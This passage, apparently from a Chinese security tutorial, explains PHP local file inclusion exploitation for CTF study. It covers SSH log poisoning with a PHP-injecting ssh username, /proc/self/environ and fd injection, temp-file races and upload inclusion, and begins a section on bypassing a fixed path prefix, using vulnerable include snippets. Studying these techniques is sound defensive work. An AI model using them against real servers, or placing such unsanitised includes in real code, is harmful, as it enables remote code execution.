/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">这里提供一道包含日志的CTF题目：</span><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">SHACTF-2017- Bon Appétit (100)-writeup </a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h3 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 18px;"><span style="font-size: 18px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">SSH log</span></h3><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">用ssh连接：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 933px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 933px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">ubuntu@VM-207-93-ubuntu:~$ ssh '&lt;?php phpinfo(); ?&gt;'@remotehost</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">之后会提示输入密码等等，随便输入。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">然后在remotehost的ssh-log中即可写入php代码：</span></div><div><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171009/17.png?raw=true" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/17.png" height="130" width="1357"/><br/></a></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">之后进行文件包含即可。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">参考：</span><a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">RCE with LFI and SSH Log Poisoning</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含environ</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php以cgi方式运行，这样environ才会保持UA头。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">environ文件存储位置已知，且environ文件可读。</span></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">可以参考这个：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">The proc/self/environ Injection </a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><li><div><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">shell via LFI - proc/self/environ method</a></div></li><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div></ol><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含fd</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">跟包含environ类似。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">参考： </span><a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">LFI Cheat Sheet：/proc/self/environ LFI Method</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含临时文件</span></h2><div style="margin: 0px 0px 25px;"><a href="http://images2015.cnblogs.com/blog/804631/201511/804631-20151116135028890-525890377.jpg" rel="group" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;"><img src="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.resources/804631-20151116135028890-525890377.jpg" height="526" width="888"/><br/></a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考</span><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">LFI With PHPInfo Assistance</a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：</span><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" style="background-color: transparent; border-bottom-width: 1px; border-bottom-style: solid; border-bottom-color: rgb(153, 153, 153); word-wrap: break-word; font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2; text-decoration: none;">XMAN夏令营-2017-babyweb-writeup </a></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">包含上传文件</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">利用条件：千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">姿势：</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">往往要配合上传的姿势，不说了，太多了。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">其余</span></h2><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h1 style="font-size: 22px; margin: 0px; padding: 0px;"><span style="font-size: 22px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">绕过姿势</span></h1><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的</span><span style="font-size: 13px; background-color: rgb(45, 45, 45); border-bottom-left-radius: 3px; border-bottom-right-radius: 3px; border-top-left-radius: 3px; border-top-right-radius: 3px; padding: 2px 4px; word-wrap: break-word; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; line-height: 2;">include $_GET['file'];</span><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;" /><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'/var/www/html/'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">.$file.</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'/test/test.php'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><div style="margin: 0px 0px 25px;"><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">这样就很“难”直接去包含前面提到的种种文件。</span></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
/></div><h2 style="margin: 20px 0px 15px; padding: 10px 0px 0px; font-size: 20px;"><span style="font-size: 20px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-weight: bold; line-height: 1.5;">指定前缀</span></h2><div style="margin: 0px 0px 25px;"><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;">先考虑一下指定了前缀的情况吧。测试代码:</span></div></div><div style="margin: 20px 0px; overflow: auto; padding: 0px; font-size: 13px; background-color: rgb(45, 45, 45); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px;"><div><br/></div><table style="font-size: 14px; border-spacing: 0px; table-layout: fixed; border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 130px;"/></colgroup><tbody><tr style="background-color:rgb(249, 249, 249);"><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; text-align: right; background-color: rgb(27, 27, 27); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">1</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">2</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">3</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(153, 153, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">4</span></div></div></td><td style="text-align: left; vertical-align: middle; border: 1px solid rgb(204, 204, 204); width: 130px; padding: 8px;"><div style="overflow: auto; font-size: 13px; padding: 10px; margin: 0px; border: none; background-color: rgb(45, 45, 45); background-position: initial initial; background-repeat: initial initial;"><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">&lt;?php</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    $file = $_GET[</span><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'file'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">];</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">    </span><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">include</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;" /><span style="font-size: 13px; color: rgb(153, 204, 153); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">'/var/www/html/'</span><span style="font-size: 13px; color: rgb(204, 204, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">.$file;</span></div><div style="height:20px;"><span style="font-size: 13px; color: rgb(204, 153, 204); font-family: consolas, Menlo, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, monospace; font-weight: normal; line-height: 1.6;">?&gt;</span></div></div></td></tr></tbody></table><div><br/></div></div><div><span style="font-size: 14px; color: rgb(85, 85, 85); font-family: Lato, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; line-height: 2;"
